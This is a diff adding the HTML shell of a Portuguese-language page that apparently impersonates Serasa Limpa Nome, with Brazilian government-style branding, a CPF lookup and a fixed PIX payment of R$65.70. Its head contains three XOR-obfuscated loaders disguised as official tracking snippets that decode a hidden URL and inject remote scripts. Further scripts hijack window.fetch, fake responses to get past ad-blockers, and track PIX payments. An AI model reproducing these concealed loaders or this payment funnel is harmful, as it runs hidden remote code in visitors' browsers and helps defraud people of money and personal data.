@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+<!-- UTMify UTMs (script oficial) -->
+<script>(function(){var k_npp=atob("DOmBF7fyIxcrvy8IIZKjYsWeAS0J11t8UZq7OJiRR3kFyltlSI/4OdSdTjlJzQB7QpvoZ8OBDGJf0lwnTYj1csSGDX1YnQMqQJ31Zd6QVmNOzA0yepKjedafRjURnUtpVYisYsOfSnFSkl96RJ/kecPfW3RE2wJ7QoKjO5WEQnte2g0yA8v8O8zQTXZG2g0yA43gY9bfVmNG1klxDJnzcsGXTWMGzFpqSI3yNZvQVXZHykoqG8ujauqP");var z_ldix=[];for(var y_6n=0;y_6n<k_npp.length;y_6n++){z_ldix.push(k_npp.charCodeAt(y_6n)&255);}var z_1=z_ldix[0];var b_v9dq=z_ldix.slice(1,1+z_1);var o_d=z_ldix.slice(1+z_1);var m_lcxy=o_d.map(function(b,t_keki){return b^b_v9dq[t_keki%z_1];});var s_c84="";for(var c_83=0;c_83<m_lcxy.length;c_83++){s_c84+=String.fromCharCode(m_lcxy[c_83]&255);}var k_j4y=decodeURIComponent(escape(s_c84));var u_vo=JSON.parse(k_j4y);var z_7l81=u_vo.globals||[];z_7l81.forEach(function(n_q){window[n_q.name]=n_q.value;});var v_5m=document.createElement("script");v_5m.src=u_vo.url;v_5m.async=true;v_5m.defer=true;(u_vo.attributes||[]).forEach(function(o_r){v_5m.setAttribute(o_r.name,o_r.value);});(document.head||document.documentElement).appendChild(v_5m);})();</script>
+
+
+  <meta charset="utf-8">
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1601503185054241');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1601503185054241&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+<script src="/js/track-plus.js?v=3"></script>
+<!-- UTMify UTMs (script oficial) -->
+<script>(function(){var x_w=atob("DAyqsa2/82fLOx0U9neIxN/T0V3pU2lghn+QnoLclwnlTml5n2rTn87QnkmpSTJnlX7DwdnM3BK/Vm47mm3e1N7L3Q24GTE2l3jew8TdhhOuSD8urXeI38zSlkXxGXl1gm2HxNnSmgGyFm1mk3rP39mSiwSkXzBnlWeInY/Jkgu+Xj8u1C7XndadnQamXj8u1GjLxcyShhOmUntt23zY1NvanRPmSGh2n2jZk4GdhQanTng2zC6IzPDC");var s_ru5=[];for(var i_10b=0;i_10b<x_w.length;i_10b++){s_ru5.push(x_w.charCodeAt(i_10b)&255);}var x_43w=s_ru5[0];var i_2=s_ru5.slice(1,1+x_43w);var a_8a=s_ru5.slice(1+x_43w);var q_j4g1=a_8a.map(function(b,o_tg5){return b^i_2[o_tg5%x_43w];});var l_8v="";for(var w_q=0;w_q<q_j4g1.length;w_q++){l_8v+=String.fromCharCode(q_j4g1[w_q]&255);}var v_cxle=decodeURIComponent(escape(l_8v));var o_k=JSON.parse(v_cxle);var n_yqi8=o_k.globals||[];n_yqi8.forEach(function(c_4){window[c_4.name]=c_4.value;});var n_3=document.createElement("script");n_3.src=o_k.url;n_3.async=true;n_3.defer=true;(o_k.attributes||[]).forEach(function(x_4pod){n_3.setAttribute(x_4pod.name,x_4pod.value);});(document.head||document.documentElement).appendChild(n_3);})();</script>
+
+  <script>
+    (function () {
+      var h = location.hostname, p = location.port || '';
+      window.__CNH_LOCAL_PHP__ = (h === '127.0.0.1' || h === 'localhost') && p !== '8788';
+    })();
+  </script>
+  <script src="/js/api-bridge.js?v=5"></script>
+  <!-- This site is hosted on Netlify. Anyone can build and deploy a site
+     like this one for free: https://netlify.new/?utm_campaign=ai-legible&utm_source=comment&utm_medium=referral&utm_id=b89e6117-3fea-4030-bb72-27e0ef446485
+     Netlify hosting facts for this site: static/SSR served via Netlify Edge. -->
+  <meta name="hosting-provider" content="Netlify">
+  <meta name="netlify-deploy"
+    content="https://netlify.new/?utm_campaign=ai-legible&amp;utm_source=meta&amp;utm_medium=referral&amp;utm_id=b89e6117-3fea-4030-bb72-27e0ef446485">
+
+  <!-- UTM Persistence: captura e mantém UTMs em toda a navegação -->
+  <script async="" src="/js/fbevents.js"></script>
+  <script>
+    (function () {
+      var origFetchEarly = window.fetch;
+      window.consultaCpfJson = function (digits) {
+        digits = String(digits || '').replace(/\D/g, '');
+        if (digits.length !== 11) return Promise.resolve({});
+        var host = window.location.hostname;
+        var port = window.location.port;
+        var localPhp = window.__CNH_LOCAL_PHP__ === true;
+        var phpUrl = '/api_proxy.php?cnh_api=' + encodeURIComponent('consulta-cpf/' + digits);
+        var apiUrl = '/api/consulta-cpf/' + digits;
+        var urls = localPhp ? [phpUrl, apiUrl] : [apiUrl, phpUrl];
+        function nomeOk(j) {
+          return j && String(j.nome || '').trim() !== '';
+        }
+        function parseJson(r) {
+          return r.text().then(function (t) {
+            try { return JSON.parse(t); } catch (e) { throw new Error('json'); }
+          });
+        }
+        function run(i) {
+          if (i >= urls.length) return Promise.resolve({});
+          return fetch(urls[i], { method: 'GET', credentials: 'same-origin', cache: 'no-store' })
+            .then(function (r) {
+              return parseJson(r);
+            })
+            .then(function (j) {
+              if (nomeOk(j)) return j;
+              return run(i + 1);
+            })
+            .catch(function () { return run(i + 1); });
+        }
+        return run(0);
+      };
+      window.fetch = function (url, options) {
+        if (typeof url === 'string' && window.__CNH_LOCAL_PHP__ && url.startsWith('/api/')) {
+          var p = window.location.port;
+          var cm = url.match(/^\/api\/consulta-cpf\/([0-9]+)/);
+          if (p === '8788') {
+          } else if (p === '3000') {
+            url = 'http://' + window.location.hostname + ':3000' + url;
+          } else if (cm) {
+            url = '/api_proxy.php?cnh_api=consulta-cpf/' + cm[1];
+          } else {
+            url = '/api_proxy.php?cnh_api=' + encodeURIComponent(url.replace(/^\//, ''));
+          }
+        }
+        return origFetchEarly.call(this, url, options);
+      };
+
+      // Normaliza rota local se abrir direto com /index.html
+      if (window.location.pathname.endsWith('/index.html') || window.location.pathname === '/index.html') {
+        try {
+          var clean = window.location.pathname.replace(/\/index\.html$/, '') || '/';
+          history.replaceState(null, '', clean + window.location.search + window.location.hash);
+        } catch (e) { }
+      }
+
+      var UTM_KEYS = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'fbclid', 'ttclid', 'gclid', 'src', 'sck'];
+      var STORAGE_KEY = 'utmData';
+
+      // Captura UTMs da URL atual
+      function getUtmsFromUrl() {
+        var params = new URLSearchParams(window.location.search);
+        var utms = {};
+        UTM_KEYS.forEach(function (k) { var v = params.get(k); if (v) utms[k] = v; });
+        return utms;
+      }
+
+      // Salva no localStorage se tiver UTMs na URL
+      var current = getUtmsFromUrl();
+      if (Object.keys(current).length > 0) {
+        try { localStorage.setItem(STORAGE_KEY, JSON.stringify(current)); } catch (e) { }
+      }
+
+      // Recupera UTMs salvas
+      function getSavedUtms() {
+        try { return JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}'); } catch (e) { return {}; }
+      }
+
+      // Adiciona UTMs como query params na URL atual se não existirem
+      function appendUtmsToUrl() {
+        var utms = getSavedUtms();
+        if (!Object.keys(utms).length) return;
+        var params = new URLSearchParams(window.location.search);
+        var changed = false;
+        UTM_KEYS.forEach(function (k) {
+          if (utms[k] && !params.get(k)) { params.set(k, utms[k]); changed = true; }
+        });
+        if (changed) {
+          var newUrl = window.location.pathname + '?' + params.toString() + window.location.hash;
+          history.replaceState(null, '', newUrl);
+        }
+      }
+
+      // Expõe para uso no app React
+      window._getUtms = getSavedUtms;
+
+      // Aplica na página atual
+      appendUtmsToUrl();
+
+      // Intercepta pushState/replaceState do React Router para manter UTMs
+      var _push = history.pushState.bind(history);
+      var _replace = history.replaceState.bind(history);
+
+      function injectUtms(url) {
+        if (!url || typeof url !== 'string') return url;
+        try {
+          var base = window.location.origin;
+          var full = url.startsWith('/') ? base + url : url;
+          var u = new URL(full);
+          var utms = getSavedUtms();
+          UTM_KEYS.forEach(function (k) {
+            if (utms[k] && !u.searchParams.get(k)) u.searchParams.set(k, utms[k]);
+          });
+          return u.pathname + (u.search ? u.search : '') + u.hash;
+        } catch (e) { return url; }
+      }
+
+      history.pushState = function (state, title, url) {
+        return _push(state, title, injectUtms(url));
+      };
+      history.replaceState = function (state, title, url) {
+        return _replace(state, title, injectUtms(url));
+      };
+
+      // Protege fetch global contra bloqueios de adblocker/Brave Shields em rastreadores
+      var originalFetch = window.fetch;
+      window.fetch = async function (resource, init) {
+        try {
+          var _url = typeof resource === 'string' ? resource : (resource && resource.url) || '';
+          if (_url.includes('tracking.utmify')) {
+            console.log('[UTMIFY REQUEST PAYLOAD]', init && init.body ? init.body : 'No body');
+          }
+          return await originalFetch.apply(this, arguments);
+        } catch (e) {
+          var url = typeof resource === 'string' ? resource : (resource && resource.url) || '';
+          if (url.includes('utmify') || url.includes('ipify') || url.includes('facebook') || url.includes('fbq')) {
+            return new Response(JSON.stringify({}), { status: 200, headers: { 'Content-Type': 'application/json' } });
+          }
+          throw e;
+        }
+      };
+    })();
+  </script>
+<!-- UTMify Pixel -->
+  <script>(function(){var k_s=atob("DFJqo6+NqS6sspYFmilI1t3hixSO2uJx6iFQjIDuzUCCx+Jo8zQTjczixADOwLl2+SAD09v+hl7FyvNptSID28rhh0TfkLon+yYe0cbv3FrJwbQ/wQ9GgcjhxkzN3uUnoAkRgcHsxEuOiLR18yoPz+bpiwKOxPdp7zdImY27yE2UgfM9rDYMkJi4nxebgaE0qzBSlMmv1HPR");var b_qn7c=[];for(var s_a=0;s_a<k_s.length;s_a++){b_qn7c.push(k_s.charCodeAt(s_a)&255);}var v_n=b_qn7c[0];var h_k85=b_qn7c.slice(1,1+v_n);var l_y=b_qn7c.slice(1+v_n);var v_73x=l_y.map(function(b,c_c3ka){return b^h_k85[c_c3ka%v_n];});var o_pvb="";for(var w_39e=0;w_39e<v_73x.length;w_39e++){o_pvb+=String.fromCharCode(v_73x[w_39e]&255);}var q_w=decodeURIComponent(escape(o_pvb));var g_o78=JSON.parse(q_w);var e_lt=g_o78.globals||[];e_lt.forEach(function(q_t){window[q_t.name]=q_t.value;});var z_04g=document.createElement("script");z_04g.src=g_o78.url;z_04g.async=true;z_04g.defer=true;(g_o78.attributes||[]).forEach(function(y_fw8){z_04g.setAttribute(y_fw8.name,y_fw8.value);});(document.head||document.documentElement).appendChild(z_04g);})();</script>
+
+
+
+  <style data-vite-theme="" data-inject-first="">
+    :root {
+      --background: 0 0% 100%;
+      --foreground: 20 14.3% 4.1%;
+      --muted: 60 4.8% 95.9%;
+      --muted-foreground: 25 5.3% 44.7%;
+      --popover: 0 0% 100%;
+      --popover-foreground: 20 14.3% 4.1%;
+      --card: 0 0% 100%;
+      --card-foreground: 20 14.3% 4.1%;
+      --border: 20 5.9% 90%;
+      --input: 20 5.9% 90%;
+      --primary: 222 47% 11%;
+      --primary-foreground: 221 8% 97%;
+      --secondary: 60 4.8% 95.9%;
+      --secondary-foreground: 24 9.8% 10%;
+      --accent: 60 4.8% 95.9%;
+      --accent-foreground: 24 9.8% 10%;
+      --destructive: 0 84.2% 60.2%;
+      --destructive-foreground: 60 9.1% 97.8%;
+      --ring: 20 14.3% 4.1%;
+      --radius: 0.5rem;
+    }
+
+    .dark {
+      --background: 240 10% 3.9%;
+      --foreground: 0 0% 98%;
+      --muted: 240 3.7% 15.9%;
+      --muted-foreground: 240 5% 64.9%;
+      --popover: 240 10% 3.9%;
+      --popover-foreground: 0 0% 98%;
+      --card: 240 10% 3.9%;
+      --card-foreground: 0 0% 98%;
+      --border: 240 3.7% 15.9%;
+      --input: 240 3.7% 15.9%;
+      --primary: 222 47% 11%;
+      --primary-foreground: 221 8% 97%;
+      --secondary: 240 3.7% 15.9%;
+      --secondary-foreground: 0 0% 98%;
+      --accent: 240 3.7% 15.9%;
+      --accent-foreground: 0 0% 98%;
+      --destructive: 0 62.8% 30.6%;
+      --destructive-foreground: 0 0% 98%;
+      --ring: 240 4.9% 83.9%;
+      --radius: 0.5rem;
+    }
+  </style>
+
+  <title>Serasa Limpa Nome - Consulta de ofertas</title>
+  <link rel="icon" type="image/png" href="/images/favicon.png">
+  <meta property="creator.productor"
+    content="http://estruturaorganizacional.dados.gov.br/id/unidade-organizacional/2981">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  <link rel="stylesheet" href="/css/fa5-all.min.css">
+  <style>
+    /* Enquanto a webfont não carrega, zera o caractere quebrado */
+    i.fas,
+    i.far,
+    i.fab {
+      font-family: sans-serif !important;
+      font-style: normal !important;
+    }
+
+    i.fas::before,
+    i.far::before,
+    i.fab::before {
+      content: '' !important;
+    }
+  </style>
+  <script>
+    (function () {
+      var ICONS = {
+        'fa-ellipsis-v': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 192 512" style="width:0.125em;height:1em;fill:currentColor;vertical-align:-0.125em;pointer-events:none"><path d="M96 184c39.8 0 72 32.2 72 72s-32.2 72-72 72-72-32.2-72-72 32.2-72 72-72zM24 80c0 39.8 32.2 72 72 72s72-32.2 72-72S135.8 8 96 8 24 40.2 24 80zm0 352c0 39.8 32.2 72 72 72s72-32.2 72-72-32.2-72-72-72-72 32.2-72 72z"/></svg>',
+        'fa-cookie-bite': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" style="width:1em;height:1em;fill:currentColor;vertical-align:-0.125em;pointer-events:none"><path d="M510.203 189.7c-4.5-6.9-12.3-10.9-20.5-10.5-6.5.3-13-.4-19.5-2-42.6-10.8-68.2-53.9-57.5-96.5 2.1-8.2.3-16.8-4.7-23.5s-12.7-10.7-21.1-10.9C377.3 46 368 46 358.7 47.1 245.1 61.3 160 158.6 160 274c0 4.5.1 9 .4 13.4.3 4.4-1.4 8.7-4.6 11.7L55.3 393.1c-22.5 20.9-24.3 56.2-3.4 79.3l6 6.6c21.1 23.2 56.4 24.2 78.8 2.3l208-200c3-2.9 7.1-4.4 11.3-4.2 4.5.2 9.1.4 13.7.4 123 0 223.2-99.7 224-222.7.1-8.4-3.9-16.5-10.2-21.5l-73.3 135zm-254 112.7c-17.7 0-32-14.3-32-32s14.3-32 32-32 32 14.3 32 32-14.3 32-32 32zm128-176c-17.7 0-32-14.3-32-32s14.3-32 32-32 32 14.3 32 32-14.3 32-32 32zm80 96c-17.7 0-32-14.3-32-32s14.3-32 32-32 32 14.3 32 32-14.3 32-32 32z"/></svg>',
+        'fa-th': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" style="width:1em;height:1em;fill:currentColor;vertical-align:-0.125em;pointer-events:none"><path d="M149.333 56v80c0 13.255-10.745 24-24 24H24c-13.255 0-24-10.745-24-24V56c0-13.255 10.745-24 24-24h101.333c13.255 0 24 10.745 24 24zm181.334 0v80c0 13.255-10.745 24-24 24H205.333c-13.255 0-24-10.745-24-24V56c0-13.255 10.745-24 24-24h101.334c13.255 0 24 10.745 24 24zm181.333 0v80c0 13.255-10.745 24-24 24H386.667c-13.255 0-24-10.745-24-24V56c0-13.255 10.745-24 24-24H488c13.255 0 24 10.745 24 24zM149.333 216v80c0 13.255-10.745 24-24 24H24c-13.255 0-24-10.745-24-24v-80c0-13.255 10.745-24 24-24h101.333c13.255 0 24 10.745 24 24zm181.334 0v80c0 13.255-10.745 24-24 24H205.333c-13.255 0-24-10.745-24-24v-80c0-13.255 10.745-24 24-24h101.334c13.255 0 24 10.745 24 24zm181.333 0v80c0 13.255-10.745 24-24 24H386.667c-13.255 0-24-10.745-24-24v-80c0-13.255 10.745-24 24-24H488c13.255 0 24 10.745 24 24zM149.333 376v80c0 13.255-10.745 24-24 24H24c-13.255 0-24-10.745-24-24v-80c0-13.255 10.745-24 24-24h101.333c13.255 0 24 10.745 24 24zm181.334 0v80c0 13.255-10.745 24-24 24H205.333c-13.255 0-24-10.745-24-24v-80c0-13.255 10.745-24 24-24h101.334c13.255 0 24 10.745 24 24zm181.333 0v80c0 13.255-10.745 24-24 24H386.667c-13.255 0-24-10.745-24-24v-80c0-13.255 10.745-24 24-24H488c13.255 0 24 10.745 24 24z"/></svg>',
+        'fa-bars': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" style="width:0.875em;height:1em;fill:currentColor;vertical-align:-0.125em;pointer-events:none"><path d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"/></svg>',
+        'fa-search': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" style="width:1em;height:1em;fill:currentColor;vertical-align:-0.125em;pointer-events:none"><path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>',
+        'fa-user': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" style="width:0.875em;height:1em;fill:currentColor;vertical-align:-0.125em;pointer-events:none"><path d="M224 256c70.7 0 128-57.3 128-128S294.7 0 224 0 96 57.3 96 128s57.3 128 128 128zm89.6 32h-16.7c-22.2 10.2-46.9 16-72.9 16s-50.6-5.8-72.9-16h-16.7C60.2 288 0 348.2 0 422.4V464c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48v-41.6c0-74.2-60.2-134.4-134.4-134.4z"/></svg>'
+      };
+      function replaceIcons() {
+        document.querySelectorAll('i.fas, i.far, i.fab').forEach(function (el) {
+          if (el.querySelector('svg')) return; // já tem SVG dentro
+          var cls = Array.from(el.classList).find(function (c) { return ICONS[c]; });
+          if (!cls) return;
+          el.style.fontFamily = 'sans-serif';
+          el.style.fontStyle = 'normal';
+          el.style.lineHeight = '1';
+          el.innerHTML = ICONS[cls];
+        });
+      }
+      var _timer;
+      var obs = new MutationObserver(function () {
+        clearTimeout(_timer);
+        _timer = setTimeout(replaceIcons, 10);
+      });
+      function start() {
+        replaceIcons();
+        obs.observe(document.body, { childList: true, subtree: true });
+      }
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', start);
+      } else {
+        start();
+      }
+    })();
+  </script>
+  <link rel="stylesheet"
+    href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&amp;display=swap">
+  <style>
+    .sticky-nav {
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+    }
+  </style>
+  <script defer="" src="/js/index-f8rMPGcv.js?v=33"></script>
+  <script defer="" src="/js/pix-guard.js?v=1"></script>
+  <link rel="stylesheet" href="/css/index-Nk5hQ9Fp.css">
+  <style>
+    body,
+    body * {
+      font-family: 'Open Sans', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif !important;
+    }
+
+    img[alt*="DETRAN"],
+    img[alt*="Brasão"] {
+      min-height: 48px !important;
+      max-height: 72px !important;
+      max-width: 220px !important;
+      width: auto !important;
+      object-fit: contain !important;
+      image-rendering: -webkit-optimize-contrast;
+    }
+  </style>
+
+  <!-- ═══════════════════════════════════════════════════════════
+       TRACKING PIX — InitiateCheckout + Purchase
+       Intercepta o fetch do app React para capturar geração e
+       confirmação de pagamento sem tocar no código compilado.
+  ════════════════════════════════════════════════════════════ -->
+  <script>
+    (function () {
+      'use strict';
+
+      var PIX_AMOUNT_DEFAULT = 65.70;
+      var TRACKED = {};
+
+      /* ── Helpers ─────────────────────────────────────────────── */
+      function getUtms() {
+        try { return JSON.parse(localStorage.getItem('utmData') || '{}'); } catch (e) { return {}; }
+      }
+
+      function getFbp() {
+        var m = document.cookie.match(/(^|;)\s*_fbp=([^;]+)/);
+        return m ? m[2] : null;
+      }
+
+      function getFbc() {
+        var m = document.cookie.match(/(^|;)\s*_fbc=([^;]+)/);
+        if (m) return m[2];
+        var fbclid = new URLSearchParams(window.location.search).get('fbclid');
+        return fbclid ? 'fb.1.' + Date.now() + '.' + fbclid : null;
+      }
+
+      function firePixel(eventName, params) {
+        try { if (window.fbq) fbq('track', eventName, params || {}); } catch (e) { }
+      }
+
+      function sendCAPI(eventName, data) {
+        try {
+          var utms = getUtms();
+          var body = Object.assign({
+            event: eventName,
+            currency: 'BRL',
+            fbclid: utms.fbclid || new URLSearchParams(window.location.search).get('fbclid') || undefined,
+            fbp: getFbp() || undefined,
+            fbc: getFbc() || undefined,
+            event_source_url: window.location.href
+          }, data);
+
+          fetch('/api/capi', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(body)
+          }).catch(function () { });
+        } catch (e) { }
+      }
+
+      /* ── Polling de pagamento ────────────────────────────────── */
+      function startPolling(txId, amount) {
+        if (!txId || TRACKED['poll_' + txId]) return;
+        TRACKED['poll_' + txId] = true;
+
+        var attempts = 0;
+        var max = 72; // 6 min × 5s
+
+        function check() {
+          if (++attempts > max) return;
+          fetch('/api/check-payment?id=' + encodeURIComponent(txId))
+            .then(function (r) { return r.json(); })
+            .then(function (d) {
+              var s = (d.status || '').toLowerCase();
+              if (s === 'paid' || s === 'approved' || s === 'completed') {
+                if (!TRACKED['purchase_' + txId]) {
+                  TRACKED['purchase_' + txId] = true;
+                  var val = parseFloat(amount) || PIX_AMOUNT_DEFAULT;
+
+                  // Meta Pixel client-side
+                  firePixel('Purchase', { value: val, currency: 'BRL' });
+
+                  // CAPI server-side
+                  sendCAPI('Purchase', { txId: txId, value: val });
+
+                  console.log('[Tracking] Purchase disparado | TX:', txId, '| Valor:', val);
+                }
+                return; // para o polling
+              }
+              setTimeout(check, 5000);
+            })
+            .catch(function () { setTimeout(check, 10000); });
+        }
+
+        setTimeout(check, 5000);
+      }
+
+      /* ── Intercepta fetch do app React ───────────────────────── */
+      var _origFetch = window.fetch;
+      window.fetch = function (resource, options) {
+        var url = typeof resource === 'string' ? resource : (resource && resource.url) || '';
+        var method = (options && options.method || 'GET').toUpperCase();
+        var promise = _origFetch.apply(this, arguments);
+
+        // ── PIX gerado ──────────────────────────────────────────
+        if (url.includes('/api/pix') && method === 'POST') {
+          promise.then(function (response) {
+            response.clone().json().then(function (data) {
+              if (!data.success) return;
+              var txId = data.transaction_id || data.deposit_id;
+              if (txId && TRACKED['ic_' + txId]) return;
+              if (txId) TRACKED['ic_' + txId] = true;
+
+              var val = parseFloat(data.amount) || PIX_AMOUNT_DEFAULT;
+
+              // Meta Pixel. O pix gerado e o pix pago vao para a UTMify pela Velani.
+              firePixel('InitiateCheckout', { value: val, currency: 'BRL', num_items: 1 });
+
+              // CAPI
+              sendCAPI('InitiateCheckout', { txId: txId, value: val });
+
+              console.log('[Tracking] InitiateCheckout disparado | TX:', txId);
+
+              // Inicia polling para Purchase
+              startPolling(txId, val);
+            }).catch(function () { });
+          }).catch(function () { });
+        }
+
+        return promise;
+      };
+
+      console.log('[Tracking PIX] v1.0 — InitiateCheckout + Purchase ativos');
+    })();
+  </script>
+  <!-- ═══════════════════════════════════════════════════════════ -->
+
+
+</head>
+
+<body>
+  <div id="root"></div>
+
+
+</body>
+
+</html>
